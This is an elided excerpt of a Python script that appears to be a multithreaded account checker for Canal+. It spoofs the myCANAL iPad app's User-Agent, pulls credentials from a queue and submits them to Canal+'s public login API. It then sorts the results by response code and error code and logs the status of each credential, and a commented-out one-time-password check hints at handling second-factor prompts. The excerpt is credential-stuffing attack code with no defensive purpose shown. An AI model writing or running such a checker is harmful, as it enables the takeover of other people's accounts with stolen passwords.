...
headv1 = {
    ...
    'User-Agent': "myCANAL/4.6.2 (iPad; iOS 13.5; Scale/2.00)",
    'Accept': '*/*',
...
class ThreadC(threading.Thread):
    ...
    def run(self):
        while not q.empty():
            ...
            r = requests.Session()
            try:
                loginURL = "https://pass-api-v2.canal-plus.com/services/apipublique/login"
                ...
                if "<TITLE>Access Denied</TITLE>" not in r1.text:
                    print(r1.text)

                if(r1.status_code not in [400, 401, 429, 403, 500, 503] and r1.json()["response"]["errorCode"] != 8):
                    print(r1.text)
                    #otp = checkOTP(cred)
                    ...
                    statusUpdate(cred, r1.json()[
                                 "response"]["errorMessage"], container, 2)
